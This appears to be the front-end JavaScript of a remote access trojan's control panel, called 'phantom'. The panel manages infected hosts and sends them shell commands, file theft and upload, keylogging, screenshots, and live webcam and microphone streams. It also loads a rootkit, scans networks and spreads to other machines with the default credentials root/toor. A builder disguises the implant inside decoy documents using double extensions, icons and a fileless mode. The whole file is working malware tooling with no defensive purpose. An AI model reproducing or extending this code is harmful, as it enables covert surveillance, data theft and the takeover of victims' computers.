const $ = (id) => document.getElementById(id);
const esc = (s) => String(s ?? '').replace(/[&<>"]/g, (c) =>
  ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));

const TOKEN = new URLSearchParams(location.search).get('token') || '';
const withToken = (u) => (TOKEN ? u + (u.includes('?') ? '&' : '?') + 'token=' + encodeURIComponent(TOKEN) : u);
const _fetch = window.fetch.bind(window);
window.fetch = (u, o) => _fetch(typeof u === 'string' && u.startsWith('/') ? withToken(u) : u, o);

let sessions = {}, selected = null, checked = new Set();
let filter = '', sortBy = 'name', hist = {}, histIdx = {};
let ws, audio = null, micAbort = null, micNext = 0;

// ---------- socket ----------
function connect() {
  ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws'
    + (TOKEN ? '?token=' + encodeURIComponent(TOKEN) : ''));
  ws.onopen = () => { $('status').textContent = 'connected'; $('status').classList.add('live'); };
  ws.onclose = () => {
    $('status').textContent = 'reconnecting…'; $('status').classList.remove('live');
    setTimeout(connect, 1800);
  };
  ws.onmessage = (e) => {
    const m = JSON.parse(e.data);
    if (m.type === 'snapshot') {
      m.sessions.forEach(s => sessions[s.id] = s);
      if (m.sessions.length && !selected) select(m.sessions[0].id);
      render();
    } else if (m.type === 'new_session') {
      sessions[m.session.id] = m.session; render();
      toast(`+ ${m.session.host.hostname || 'host'} joined`);
      if (!selected) select(m.session.id);
    } else if (m.type === 'drop') {
      delete sessions[m.session_id];
      if (selected === m.session_id) { selected = null; $('term').textContent = ''; }
      render();
    } else if (m.type === 'result') {
      const s = sessions[m.session_id];
      if (s) (s.history = s.history || []).push(m.result);
      if (m.session_id === selected) { printResult(m.result); captureError(m.result); }
    } else if (m.type === 'blob') {
      const s = sessions[m.session_id];
      if (s) { (s.blobs = s.blobs || []).push(m.blob); if (m.session_id === selected) addBlob(m.blob); }
      if (['screenshot', 'webcam'].includes(m.blob.kind)) toast(`capture: ${m.blob.name}`);
    } else if (m.type === 'stream') {
      if (m.session_id === selected) {
        if (m.kind === 'cam') $('camstat').textContent = `frame ${m.seq} · ${(m.size / 1024).toFixed(0)} KB`;
        else $('micstat').textContent = `chunk ${m.seq} · ${m.size} B`;
      }
      const s = sessions[m.session_id];
      if (s) { s.streams = s.streams || {}; s.streams[m.kind] = true; }
    }
  };
}
connect();

// ---------- ui helpers ----------
function toast(t, bad) {
  const d = document.createElement('div');
  d.className = 'toast' + (bad ? ' bad' : ''); d.textContent = t;
  $('toasts').appendChild(d);
  setTimeout(() => d.remove(), 4200);
}
const initials = (s) => (s.host.hostname || s.host.ip || '??').slice(0, 2).toUpperCase();

function render() {
  let list = Object.values(sessions);
  if (filter) {
    const f = filter.toLowerCase();
    list = list.filter(s => [s.host.hostname, s.host.ip, s.host.user, s.host.os, s.remote, (s.tags || []).join(' ')]
      .some(v => (v || '').toLowerCase().includes(f)));
  }
  list.sort((a, b) => {
    if (sortBy === 'ip') return (a.host.ip || '').localeCompare(b.host.ip || '');
    if (sortBy === 'seen') return (b.last_seen || 0) - (a.last_seen || 0);
    return (a.host.hostname || '').localeCompare(b.host.hostname || '');
  });
  $('count').textContent = Object.keys(sessions).length + ' hosts';
  const ul = $('sessions'); ul.innerHTML = '';
  list.forEach(s => {
    const li = document.createElement('li');
    if (s.id === selected) li.classList.add('sel');
    li.innerHTML = `<input type="checkbox" ${checked.has(s.id) ? 'checked' : ''}>
      <span class="avatar">${esc(initials(s))}</span>
      <div class="host-main">
        <div class="host-name">${esc(s.host.hostname || '?')}
          ${s.host.elevated ? '<span class="tag">ADMIN</span>' : ''}</div>
        <div class="host-sub">${esc(s.host.user || '?')}@${esc(s.remote || s.host.ip || '?')}</div>
        <div class="host-sub">${esc(s.host.os || '')}
          ${s.streams && s.streams.cam ? ' · <span style="color:#f0a03e">camera live</span>' : ''}</div>
        ${s.tags && s.tags.length ? `<div class="host-sub">#${esc(s.tags.join(' #'))}</div>` : ''}
      </div>
      <span class="dot ${s.alive ? 'live' : ''}"></span>`;
    li.querySelector('input').onclick = (ev) => {
      ev.stopPropagation();
      ev.target.checked ? checked.add(s.id) : checked.delete(s.id);
    };
    li.onclick = () => select(s.id);
    ul.appendChild(li);
  });
}

function select(id) {
  stopCam(); stopMic();
  selected = id;
  const s = sessions[id];
  if (!s) return;
  $('target').textContent = `${s.host.hostname} · ${s.host.user}@${s.remote || s.host.ip}`;
  $('targetpath').textContent = s.host.elevated ? 'administrator' : '';
  $('term').textContent = '';
  (s.history || []).forEach(printResult);
  $('infoout').textContent = JSON.stringify(s.host, null, 2);
  $('i_sleep').value = s.sleep; $('i_jitter').value = s.jitter;
  $('i_note').value = s.note || ''; $('i_tags').value = (s.tags || []).join(', ');
  $('camview').removeAttribute('src');
  renderGallery();
  render();
}

function log(t) {
  const d = document.createElement('div');
  d.className = 'meta'; d.textContent = t;
  $('term').appendChild(d); $('term').scrollTop = $('term').scrollHeight;
}

function captureError(r) {
  if (r && r.ok === false && r.err) toast(r.err.slice(0, 110), true);
}

// ---------- results ----------
function printResult(r) {
  const c = document.createElement('div');
  c.className = 'cmd'; c.textContent = `\n$ ${(r.cmd_id || '').slice(0, 8)}`;
  $('term').appendChild(c);
  const o = document.createElement('div');
  o.className = r.ok ? '' : 'err';
  o.textContent = r.ok ? (r.out || '') : ('ERR: ' + r.err);
  $('term').appendChild(o); $('term').scrollTop = $('term').scrollHeight;
  if (!r.ok || !r.out) return;

  let parsed = null;
  try { parsed = JSON.parse(r.out); } catch (_) {}
  if (Array.isArray(parsed) && parsed.length) {
    if ('name' in parsed[0]) { renderFiles(parsed); return; }
    if ('ip' in parsed[0]) { renderScan(parsed); return; }
  }
  if (parsed && parsed.url) addBlob({ ...parsed, ts: Date.now() });
}

function renderFiles(arr) {
  const tb = $('ftable').querySelector('tbody'); tb.innerHTML = '';
  arr.forEach(f => {
    const tr = document.createElement('tr');
    tr.innerHTML = `<td class="name">${esc(f.name)}${f.dir ? '/' : ''}</td>
      <td class="size">${f.size}</td>
      <td>${f.dir ? '' : '<button class="mini">get</button>'}</td>`;
    tr.querySelector('.name').onclick = () => {
      $('fpath').value = f.name;
      sendCmd('lsjson', { path: f.name });
    };
    const dl = tr.querySelector('button');
    if (dl) dl.onclick = (e) => { e.stopPropagation(); sendCmd('download', { path: f.name }); };
    tb.appendChild(tr);
  });
}

function renderScan(hits) {
  const box = document.createElement('div');
  box.textContent = '\n' + hits.map(h => `${h.ip}  →  ${h.ports.join(', ')}`).join('\n');
  $('term').appendChild(box); $('term').scrollTop = $('term').scrollHeight;
}

// ---------- gallery (real files, no base64) ----------
function blobsOf(sid) {
  const s = sessions[sid];
  if (!s) return [];
  s.blobs = s.blobs || [];
  return s.blobs;
}

function addBlob(b) {
  if (!b || !b.url) return;
  blobsOf(selected).push(b);
  renderGallery();
  if (b.kind === 'file') {
    const a = document.createElement('a');
    a.textContent = b.name; a.href = withToken(b.url); a.download = b.name;
    $('dllist').prepend(a);
  }
}

function renderGallery() {
  const box = $('mediaout'); box.innerHTML = '';
  const list = (selected ? blobsOf(selected) : []).slice().reverse();
  if (!list.length) {
    box.innerHTML = '<div class="empty">no captures yet — start the camera, grab a screenshot or pull a file</div>';
    return;
  }
  list.forEach(b => {
    const ext = (b.name.split('.').pop() || '').toLowerCase();
    const card = document.createElement('div');
    card.className = 'shot';
    if (b.media && b.media.startsWith('image')) {
      const img = document.createElement('img');
      img.src = withToken(b.url); img.alt = b.name; img.loading = 'lazy';
      img.onclick = () => window.open(withToken(b.url), '_blank');
      card.appendChild(img);
      card.insertAdjacentHTML('beforeend',
        `<div class="cap"><span>${new Date((b.ts || 0) * 1000).toLocaleTimeString()}</span>
         <a href="${withToken(b.url)}" download="${esc(b.name)}">save</a></div>`);
    } else if (b.media && b.media.startsWith('audio')) {
      const au = document.createElement('audio');
      au.controls = true; au.src = withToken(b.url); au.preload = 'none';
      card.appendChild(au);
      card.insertAdjacentHTML('beforeend',
        `<div class="cap"><span>${esc(b.name)}</span>
         <a href="${withToken(b.url)}" download="${esc(b.name)}">save</a></div>`);
    } else {
      card.innerHTML = `<div style="padding:26px 10px;text-align:center" class="host-sub">FILE</div>
        <div class="cap"><span>${esc(b.name)}</span>
        <a href="${withToken(b.url)}" download="${esc(b.name)}">get</a></div>`;
    }
    box.appendChild(card);
  });
}

// ---------- live camera (MJPEG) ----------
function camStart() {
  if (!selected) return;
  sendCmd('cam_stream', { fps: +$('cam_fps').value || 2, width: 640 });
  $('cam_on').classList.add('on');
  $('camstat').textContent = 'connecting…';
  $('camview').src = withToken(`/api/session/${selected}/cam.mjpg?t=${Date.now()}`);
  showPane('media');
}
function stopCam() {
  $('cam_on').classList.remove('on');
  $('camview').removeAttribute('src');
  $('camstat').textContent = 'idle';
}
function camStop() {
  if (!selected) return;
  sendCmd('cam_stream', { sub: 'stop' });
  stopCam();
}


// ---------- live microphone (raw PCM stream, Web Audio) ----------
async function micStart() {
  if (!selected) return;
  $('mic_on').classList.add('on');
  $('micstat').textContent = 'connecting…';
  sendCmd('mic_stream', {});
  showPane('media');

  micAbort = new AbortController();
  try {
    const res = await fetch(`/api/session/${selected}/mic.pcm`, { signal: micAbort.signal });
    if (!res.body) throw new Error('stream unavailable');
    if (!audio) {
      const Ctx = window.AudioContext || window.webkitAudioContext;
      audio = new Ctx();
      micNext = audio.currentTime;
    }
    if (audio.state === 'suspended') await audio.resume();

    const reader = res.body.getReader();
    let rest = new Uint8Array(0);
    for (;;) {
      const { value, done } = await reader.read();
      if (done) break;
      const buf = new Uint8Array(rest.length + value.length);
      buf.set(rest); buf.set(value, rest.length);
      const usable = buf.length - (buf.length % 2);
      rest = buf.slice(usable);
      if (usable) playPcm(new Int16Array(buf.buffer, buf.byteOffset, usable / 2));
    }
  } catch (e) {
    if (e.name !== 'AbortError') { $('micstat').textContent = e.message; toast(e.message, true); }
  }
}

function stopMic() {
  $('mic_on').classList.remove('on');
  if (micAbort) { micAbort.abort(); micAbort = null; }
  $('micstat').textContent = 'idle';
  $('miclevel').style.width = '0%';
}
function micStop() {
  if (selected) sendCmd('mic_stream', { sub: 'stop' });
  stopMic();
}

function playPcm(pcm) {
  if (!audio) return;
  const f32 = new Float32Array(pcm.length);
  let peak = 0;
  for (let i = 0; i < pcm.length; i++) {
    const v = pcm[i] / 32768;
    f32[i] = v;
    const a = Math.abs(v);
    if (a > peak) peak = a;
  }
  $('miclevel').style.width = Math.min(100, peak * 140) + '%';
  drawWave(f32);

  const ab = audio.createBuffer(1, f32.length, 16000);
  ab.copyToChannel(f32, 0);
  const src = audio.createBufferSource();
  src.buffer = ab; src.connect(audio.destination);
  const now = audio.currentTime;
  if (micNext < now || micNext > now + 1.2) micNext = now + 0.04;
  src.start(micNext);
  micNext += ab.duration;
}

function drawWave(f32) {
  const cv = $('micwave');
  if (!cv) return;
  cv.width = cv.clientWidth || 320;
  const ctx = cv.getContext('2d');
  ctx.clearRect(0, 0, cv.width, cv.height);
  ctx.strokeStyle = '#3ddc97'; ctx.lineWidth = 1.4; ctx.beginPath();
  const step = Math.max(1, Math.floor(f32.length / cv.width));
  for (let x = 0; x < cv.width; x++) {
    const v = f32[x * step] || 0;
    const y = cv.height / 2 - v * cv.height * 0.46;
    x ? ctx.lineTo(x, y) : ctx.moveTo(x, y);
  }
  ctx.stroke();
}

// ---------- panes ----------
function showPane(name) {
  document.querySelectorAll('.tabs button').forEach(x => x.classList.toggle('on', x.dataset.st === name));
  document.querySelectorAll('.tabpane').forEach(p => p.classList.toggle('on', p.id === name));
}
document.querySelectorAll('.tabs button').forEach(b => b.onclick = () => showPane(b.dataset.st));
document.querySelectorAll('.rail button').forEach(b => b.onclick = () => {
  document.querySelectorAll('.rail button').forEach(x => x.classList.remove('on'));
  b.classList.add('on');
  document.querySelectorAll('main.tab').forEach(m => m.classList.remove('on'));
  $(b.dataset.tab).classList.add('on');
  if (b.dataset.tab === 'build') loadConfig();
});


// ---------- commands ----------
function buildArgs(type, val) {
  if (type === 'shell') return { cmd: val };
  if (type === 'ls' || type === 'lsjson') return { path: val || '.' };
  if (type === 'cat' || type === 'download') return { path: val };
  if (type === 'rootkit') return { ko: '/tmp/phantom_rootkit.ko', port: String(cfg.port || 443) };
  if (type === 'keylog') return { sub: val || 'dump' };
  if (type === 'scan') return { subnet: '', ports: '22,80,443' };
  if (type === 'spread') return { user: 'root', pass: 'toor', targets: '' };
  if (type === 'cam_stream') return { fps: 2, width: 640 };
  if (type === 'mic_stream') return {};
  return {};
}

function sendCmd(type, args) {
  if (!selected) return;
  fetch(`/api/session/${selected}/command`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ type, args })
  });
  log(`> [${type}] ${JSON.stringify(args)}`);
}

$('cmdform').onsubmit = (e) => {
  e.preventDefault(); if (!selected) return;
  const type = $('type').value, val = $('cmd').value.trim();
  (hist[selected] = hist[selected] || []).push(val);
  histIdx[selected] = hist[selected].length;
  sendCmd(type, buildArgs(type, val)); $('cmd').value = '';
};

$('cmd').onkeydown = (e) => {
  const h = hist[selected] || [];
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    histIdx[selected] = Math.max(0, (histIdx[selected] ?? h.length) - 1);
    $('cmd').value = h[histIdx[selected]] || '';
  }
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    histIdx[selected] = Math.min(h.length, (histIdx[selected] ?? 0) + 1);
    $('cmd').value = h[histIdx[selected]] || '';
  }
};

$('clear').onclick = () => { $('term').textContent = ''; };
$('medclear').onclick = () => { if (selected) sessions[selected].blobs = []; renderGallery(); };

document.querySelectorAll('.chip[data-q]').forEach(b => b.onclick = () => {
  const q = b.dataset.q;
  if (q === 'whoami') sendCmd('shell', { cmd: 'whoami' });
  else if (q === 'ls') sendCmd('lsjson', { path: '.' });
  else if (q === 'keylog start') sendCmd('keylog', { sub: 'start' });
  else if (q === 'cam') camStart();
  else if (q === 'mic') micStart();
  else sendCmd(q, buildArgs(q, ''));
});

$('bgo').onclick = async () => {
  const type = $('btype').value, val = $('bcmd').value.trim();
  const ids = checked.size ? [...checked] : Object.keys(sessions);
  const r = await fetch('/api/broadcast', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ session_ids: ids, type, args: buildArgs(type, val) })
  });
  const j = await r.json();
  $('bstatus').textContent = `queued on ${j.issued}`;
  setTimeout(() => $('bstatus').textContent = '', 2500);
};

$('selectall').onclick = (e) => {
  checked.clear();
  if (e.target.checked) Object.keys(sessions).forEach(id => checked.add(id));
  render();
};
$('search').oninput = (e) => { filter = e.target.value; render(); };
$('sort').onchange = (e) => { sortBy = e.target.value; render(); };
$('export').onclick = () => {
  const blob = new Blob([JSON.stringify(sessions, null, 2)], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob); a.download = 'phantom_sessions.json'; a.click();
};

$('cam_on').onclick = camStart;
$('cam_off').onclick = camStop;
$('mic_on').onclick = micStart;
$('mic_off').onclick = micStop;
$('shot').onclick = () => sendCmd('screenshot', {});
$('snap').onclick = () => sendCmd('webcam', {});
$('recwav').onclick = () => sendCmd('mic', { secs: 5 });

// ---------- files ----------
$('flist').onclick = () => sendCmd('lsjson', { path: $('fpath').value || '.' });
$('fup').onclick = async () => {
  const f = $('fupload').files[0]; if (!f || !selected) return;
  const b64 = await new Promise(res => {
    const fr = new FileReader();
    fr.onload = () => res(fr.result.split(',')[1]);
    fr.readAsDataURL(f);
  });
  sendCmd('upload', { path: ($('fpath').value || '.') + '/' + f.name, b64 });
};

// ---------- keylog / info ----------
$('klstart').onclick = () => sendCmd('keylog', { sub: 'start' });
$('klstop').onclick = () => sendCmd('keylog', { sub: 'stop' });
$('kldump').onclick = () => sendCmd('keylog', { sub: 'dump' });
$('klclear').onclick = () => sendCmd('keylog', { sub: 'dump', clear: 'true' });

const _pr = printResult;
printResult = function (r) {
  _pr(r);
  if (r.ok && r.out && $('keylog').classList.contains('on')) $('klout').textContent += r.out;
};

$('i_set').onclick = async () => {
  if (!selected) return;
  await fetch(`/api/session/${selected}/sleep`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ sleep: +$('i_sleep').value, jitter: +$('i_jitter').value })
  });
  toast('sleep updated');
};
$('i_save').onclick = async () => {
  if (!selected) return;
  await fetch(`/api/session/${selected}`, {
    method: 'PATCH', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      note: $('i_note').value,
      tags: $('i_tags').value.split(',').map(t => t.trim()).filter(Boolean)
    })
  });
  toast('saved');
};


// ---------- builder ----------
async function loadConfig() {
  try {
    const r = await fetch('/api/config');
    if (!r.ok) return;
    cfg = await r.json();
  } catch (_) { return; }
  $('b_url').value = cfg.public_url || '';
  $('b_urlhint').textContent = cfg.tls
    ? 'auto-detected secure endpoint'
    : 'plain http on the wire — terminate TLS in front (Coolify does this)';
}

$('b_autourl').onclick = async () => { await loadConfig(); toast('callback url refreshed'); };

let pickedFile = null;

function pickFile(f) {
  pickedFile = f || null;
  $('dropmsg').innerHTML = f
    ? `<div class="big">${esc(f.name)}</div><div class="hint">${(f.size / 1024).toFixed(1)} KB — ready to bind</div>`
    : '<div class="big">Drop a file or click to choose</div><div class="hint">pdf · docx · xlsx · zip · jpg · any file</div>';
  $('drop').classList.toggle('filled', !!f);
  if (f && !$('b_name').value) $('b_name').value = f.name.replace(/\.[^.]+$/, '');
}

$('drop').onclick = () => $('b_file').click();
$('b_file').onchange = (e) => pickFile(e.target.files[0]);
['dragenter', 'dragover'].forEach(ev => $('drop').addEventListener(ev, (e) => {
  e.preventDefault(); $('drop').classList.add('over');
}));
['dragleave', 'drop'].forEach(ev => $('drop').addEventListener(ev, (e) => {
  e.preventDefault(); $('drop').classList.remove('over');
}));
$('drop').addEventListener('drop', (e) => { if (e.dataTransfer.files[0]) pickFile(e.dataTransfer.files[0]); });

$('b_build').onclick = async () => {
  if (!pickedFile) { toast('pick a file to bind first', true); return; }
  $('b_build').disabled = true;
  $('b_msg').textContent = 'building…';
  const fd = new FormData();
  fd.append('file', pickedFile);
  fd.append('name', $('b_name').value);
  fd.append('os', $('b_os').value);
  fd.append('arch', $('b_arch').value);
  fd.append('url', $('b_url').value.trim());
  fd.append('sleep', $('b_sleep').value);
  fd.append('jitter', $('b_jitter').value);
  fd.append('delay', $('b_delay').value);
  fd.append('console', $('b_console').checked ? '1' : '0');
  fd.append('double_ext', $('b_double').checked ? '1' : '0');
  fd.append('icon', $('b_icon').checked ? '1' : '0');
  const r = await fetch('/api/bind', { method: 'POST', body: fd });
  $('b_build').disabled = false;
  if (!r.ok) { $('b_msg').textContent = 'ERROR: ' + await r.text(); return; }
  const j = await r.json();
  $('b_msg').textContent = `${j.binary} · ${(j.size / 1048576).toFixed(1)} MB`;
  toast('bound ' + j.binary);
  loadBuilds();
};

$('b_raw').onclick = async () => {
  $('b_msg').textContent = 'building…';
  const body = {
    name: $('b_name').value || 'phantom', os: $('b_os').value, arch: $('b_arch').value,
    url: $('b_url').value.trim() || undefined, sleep: +$('b_sleep').value,
    jitter: +$('b_jitter').value, delay: +$('b_delay').value,
    console: $('b_console').checked, fileless: $('b_fileless').checked
  };
  const r = await fetch('/api/build', {
    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body)
  });
  if (!r.ok) { $('b_msg').textContent = 'ERROR: ' + await r.text(); return; }
  const j = await r.json();
  $('b_msg').textContent = 'built ' + j.binary;
  toast('built ' + j.binary);
  loadBuilds();
};

async function loadBuilds() {
  const r = await fetch('/api/builds');
  if (!r.ok) return;
  const j = await r.json();
  $('builds').innerHTML = '';
  j.forEach(b => {
    const li = document.createElement('li');
    const ext = (b.name.split('.').pop() || '').toLowerCase();
    li.innerHTML = `<span class="badge ${esc(ext)}">${esc(ext)}</span>
      <a class="nm" href="${withToken('/api/builds/' + encodeURIComponent(b.name))}" download>${esc(b.name)}</a>
      <span class="sz">${(b.size / 1024).toFixed(1)} KB</span>
      <button class="mini">del</button>`;
    li.querySelector('button').onclick = async () => {
      await fetch('/api/builds/' + encodeURIComponent(b.name), { method: 'DELETE' });
      loadBuilds();
    };
    $('builds').appendChild(li);
  });
}

loadBuilds();
loadConfig();

